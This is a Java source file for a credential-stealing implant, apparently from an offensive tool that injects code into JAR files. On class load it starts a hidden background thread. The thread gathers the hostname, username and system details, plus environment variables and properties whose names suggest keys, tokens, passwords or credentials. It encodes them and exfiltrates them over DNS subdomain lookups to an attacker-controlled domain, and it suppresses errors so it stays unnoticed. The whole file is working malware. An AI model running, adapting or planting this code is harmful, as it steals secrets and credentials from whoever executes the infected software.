package io.github.w1th4d.jarplant.implants;

import java.math.BigInteger;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.security.SecureRandom;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class StealerExfil implements Runnable, Thread.UncaughtExceptionHandler {
    public static final String TOKEN_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-_.:,;<>|!\"#¤%&/()=+?`'^~'*@()[]{} \n\\";
    public static final String URL_ALPHABET = "abcdefghijklmnopqrstuvwxyz0123456789";
    private static final int MAX_SEQNO_LEN = 5;

    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
    static volatile int CONF_DELAY_MS = 0;

    /**
     * Regular expression of Key to look for while extracting secrets.
     * This regex is currently used for ENV variables and java system
     * properties but can be used wider in the future.
     */
    static volatile String CONF_STEAL_THIS_PROPERTY_KEY_REGEX = "(?i)(sun|version|url|uri|jdbc|connection|server|host|port|client|database|db|key|secret|access|proxy|sock|smtp|id|project|cred|storage|pubsub|ftp|sftp|file|grpc|http|ipc|shared|vendor|region|endpoint|schema|user|pass|auth|path|temp|ssl|keyspace|contact|store|zookeeper|activemq|corba|modbus|opc|mqtt|rabbitmq|dynamodb|redis|blob|cassandra|mysql|mssql|oracle|postgres|mongodb|aws|gcp|azure|sqs|ses|queue|net|service|broker|name|wallet|location|tns|encrypt|sasl|conf)";
    static volatile String CONF_STEAL_THIS_ENV_KEY_REGEX = "(?i)(_KEY|_TOKEN|_ID|_SECRET|_CREDENTIALS|_CRED|_PROJECT|CLOUD_|_DOMAIN|_SID|INIT_|_PROXY)";

    /**
     * Domain to use for data exfiltration.
     * Data will be encoded and included as subdomains to the specified domain.
     * Set this to an Interactsh instance (or equivalent) under your control. Example: 'abdcef12345.oast.fun'.
     */
    static volatile String CONF_DOMAIN;

    /**
     * Maximum number of subdomains.
     * A value of 0 (default) means no limit.
     */
    static volatile int CONF_MAX_SUBDOMAINS = 0;

    /**
     * Maximum number of characters for each subdomain.
     * DNS specifies a maximum number of 63 characters.
     * A custom value may be set if there are concerns that upstream DNS servers may dislike a large number of
     * subdomains.
     * Note: This simple implant will just exclude any excess characters from an over-sized field (resulting in data
     * loss).
     */
    static volatile int CONF_SUBDOMAIN_MAX_LEN = 63;

    /**
     * Maximum length of the whole fully-qualified domain name.
     * DNS specifies a maximum total length of a domain name (all subdomains) of 255 characters. However, there need to
     * be space for the length octet and a 0, so the actual max length of a domain name is 253.
     * A custom value may be set if there are concerns that upstream DNS servers may dislike large requests.
     * Note: This simple implant will just exclude any encoded data fields that does not fit.
     */
    static volatile int CONF_FQDN_MAX_LEN = 253;

    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                StealerExfil implant = new StealerExfil();
                Thread background = new Thread(implant);
                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                background.setUncaughtExceptionHandler(implant);
                background.start();
            }
        }
    }

    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException ignored) {
            }
        }

        payload(System.getenv(), System.getProperties());
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }

    void payload(Map<String, String> envVars, Properties javaProps) {
        if (CONF_DOMAIN == null || CONF_DOMAIN.isEmpty()) {
            return;
        }

        Map<String, String> exfilData = new LinkedHashMap<>();
        exfilData.put("host", getHostname());
        exfilData.put("user", getUsername(envVars, javaProps));
        exfilData.put("os", getOsInfo(javaProps));
        exfilData.put("jvm", getRuntimeInfo(javaProps));
        exfilData.putAll(getJuicyEnvVars(envVars));
        exfilData.putAll(getJuicyProperties(javaProps));

        List<String> requests = encode(exfilData);

        requests.parallelStream().forEach(StealerExfil::resolve);
    }

    static List<String> encode(Map<String, String> exfilData) {
        String packed = pack(exfilData);
        //System.out.println("Encoding and exfiltrating the following data:\n" + packed);
        String encoded = rebase(packed, TOKEN_ALPHABET, URL_ALPHABET);
        String uniqueId = getUniqueId();
        List<String> requests = split(encoded, uniqueId, CONF_DOMAIN);
        return requests;
    }

    static Map<String, String> getJuicyEnvVars(Map<String, String> env) {
        return getMatcingKeys(env, CONF_STEAL_THIS_ENV_KEY_REGEX);
    }

    static Map<String, String> getJuicyProperties(Properties props) {
        return getMatcingKeys(propToMap(props), CONF_STEAL_THIS_PROPERTY_KEY_REGEX);
    }

    /**
     * Convert Properties object to Map<String, String> type.
     * @param prop java.util Properties object.
     * @return Map of key value pair strings.
     */
    static Map<String, String> propToMap(Properties prop) {
        Map<String, String> map = new HashMap<>();

        for (Enumeration<?> e = prop.propertyNames(); e.hasMoreElements();) {
            String key = (String) e.nextElement();
            String value = prop.getProperty(key); // Safely get value as String
            map.put(key, value);
        }

        return map;
    }

    /**
     * Map Key matcher returns whatever is worth stealing in a Map of <String, String>.
     * @param map Map of Key value pair properties to match
     * @return      Matching properties as Map of Strings
     */
    static Map<String, String> getMatcingKeys(Map<String, String> map, String interesting) {
        Pattern pattern = Pattern.compile(interesting, Pattern.CASE_INSENSITIVE);
        Map<String, String> matching = new HashMap<>();

        for (Map.Entry<String, String> entry : map.entrySet()) {
            String key = entry.getKey();
            String value = entry.getValue();

            Matcher matcher = pattern.matcher(key);
            if (matcher.find()) {
                matching.put(key, value);
            }
        }
        return matching;
    }

    static String pack(Map<String, String> kv) {
        StringBuilder output = new StringBuilder();

        for (Map.Entry<String, String> entry : kv.entrySet()) {
            String key = entry.getKey();
            String value = entry.getValue();

            output.append(key).append("=").append(value).append("\n");
        }

        return output.toString();
    }

    public static String rebase(CharSequence input, String fromAlphabet, String toAlphabet) {
        final BigInteger FROM_BASE = BigInteger.valueOf(fromAlphabet.length());
        final BigInteger TO_BASE = BigInteger.valueOf(toAlphabet.length());

        BigInteger accumulator = BigInteger.ZERO;
        int digitPlace = 0;
        long trailingZeroCodes = 0;

        // Assume all input characters to be of Base-X and add them all up into a big integer
        for (int inputIndex = 0; inputIndex < input.length(); inputIndex++) {
            char inputChar = input.charAt(inputIndex);
            int compactCode = fromAlphabet.indexOf(inputChar);
            if (compactCode == -1) {
                // Input character is outside the expected alphabet - skip it
                continue;   // Continue with the next input char but do _not_ increase digitPlace
            } else {
                // Math: accumulator += compactCode * FROM_BASE^digitPlace
                BigInteger compactCodeBig = BigInteger.valueOf(compactCode);
                BigInteger significance = FROM_BASE.pow(digitPlace);
                BigInteger valueIncrease = compactCodeBig.multiply(significance);
                accumulator = accumulator.add(valueIncrease);
                digitPlace++;
            }

            // Keep track of the amount of zeroth compact codes at the end (but only at the end)
            if (compactCode == 0) {
                trailingZeroCodes++;
            } else {
                trailingZeroCodes = 0;
            }
        }

        // accumulator now holds all input values

        // Draw Base-Y values out of the accumulator until it's empty
        StringBuilder output = new StringBuilder();
        while (accumulator.compareTo(BigInteger.ZERO) > 0) {
            BigInteger[] divmod = accumulator.divideAndRemainder(TO_BASE);
            BigInteger div = divmod[0];
            BigInteger mod = divmod[1];

            int compactCode = mod.intValue();
            // This is probably a good opportunity to combine compactCode with a stream cipher
            char toBaseChar = toAlphabet.charAt(compactCode);
            output.append(toBaseChar);
            accumulator = div;
        }

        // Due to some math quirks, the last character will be lost if its index is 0. Compensate for this.
        for (int i = 0; i < trailingZeroCodes; i++) {
            output.append(toAlphabet.charAt(0));
        }

        return output.toString();
    }

    static List<String> split(String encodedData, String uniqueId, String baseDomain) {
        List<String> requests = new LinkedList<>();

        if (!baseDomain.startsWith(".")) {
            baseDomain = "." + baseDomain;
        }
        int overheadLength = 1 + uniqueId.length() + 1 + MAX_SEQNO_LEN + 1 + baseDomain.length();
        if (overheadLength > CONF_FQDN_MAX_LEN) {
            // Throw an exception that will never be seen...
            throw new RuntimeException("CONF_FQDN_MAX_LEN too short for the value of CONF_DOMAIN!");
        }

        // Split encoded data into subdomains
        LinkedList<String> splits = new LinkedList<>();
        while (!encodedData.isEmpty()) {
            if (encodedData.length() > CONF_SUBDOMAIN_MAX_LEN) {
                String subdomain = encodedData.substring(0, CONF_SUBDOMAIN_MAX_LEN);
                encodedData = encodedData.substring(CONF_SUBDOMAIN_MAX_LEN);
                splits.add(subdomain);
            } else {
                splits.add(encodedData);
                encodedData = "";
            }
        }

        // Split subdomains into requests
        int sequenceNumber = 0;
        int countSubdomains = 0;
        StringBuilder request = beginRequestBuild(uniqueId, sequenceNumber++, baseDomain);
        Iterator<String> reverse = splits.descendingIterator();
        while (reverse.hasNext()) {
            if (CONF_MAX_SUBDOMAINS != 0 && countSubdomains >= CONF_MAX_SUBDOMAINS) {
                // Maximum amount of subdomains per query reached, move on to create a new query
                requests.add(request.toString());
                request = beginRequestBuild(uniqueId, sequenceNumber++, baseDomain);
                countSubdomains = 0;
            }

            String split = reverse.next();
            if (split.length() + ".".length() + request.length() > CONF_FQDN_MAX_LEN) {
                // This DNS request is "full". Finalize it and begin on a new one.
                requests.add(request.toString());
                request = beginRequestBuild(uniqueId, sequenceNumber++, baseDomain);
                countSubdomains = 0;
            }

            request.insert(0, split + ".");
            countSubdomains++;
        }
        requests.add(request.toString());

        return requests;
    }

    private static StringBuilder beginRequestBuild(String uniqueId, int sequenceNumber, String baseDomain) {
        StringBuilder request = new StringBuilder();
        request.append(uniqueId).append("-").append(sequenceNumber).append(baseDomain);
        return request;
    }

    // Use the default system resolver for now
    static void resolve(String domain) {
        try {
            //noinspection ResultOfMethodCallIgnored
            InetAddress.getByName(domain);
        } catch (UnknownHostException ignored) {
        }
    }

    private static String getHostname() {
        String hostname = "unknown";
        try {
            hostname = InetAddress.getLocalHost().getHostName();
        } catch (UnknownHostException ignored) {
        }

        return hostname;
    }

    private static String getUsername(Map<String, String> envVars, Properties javaProps) {
        String username = javaProps.getProperty("user.name");
        if (isUnknown(username)) {
            username = envVars.get("USERNAME");
            if (isUnknown(username)) {
                username = "unknown";
            }
        }
        return username;
    }

    private String getOsInfo(Properties javaProps) {
        String osName = javaProps.getProperty("os.name");
        if (isUnknown(osName)) {
            osName = "unknown";
        }

        String osVer = javaProps.getProperty("os.version");
        if (isUnknown(osVer)) {
            osVer = "unknown";
        }

        return osName + " " + osVer;
    }

    private static String getRuntimeInfo(Properties javaProps) {
        String runtimeVer = javaProps.getProperty("java.vm.version");
        if (isUnknown(runtimeVer)) {
            runtimeVer = "unknown";
        }
        return runtimeVer;
    }

    private static boolean isUnknown(String value) {
        return value == null || value.isEmpty();
    }

    private static String getUniqueId() {
        Random rng = new SecureRandom();
        return "" + rng.nextInt(0, Integer.MAX_VALUE);
    }
}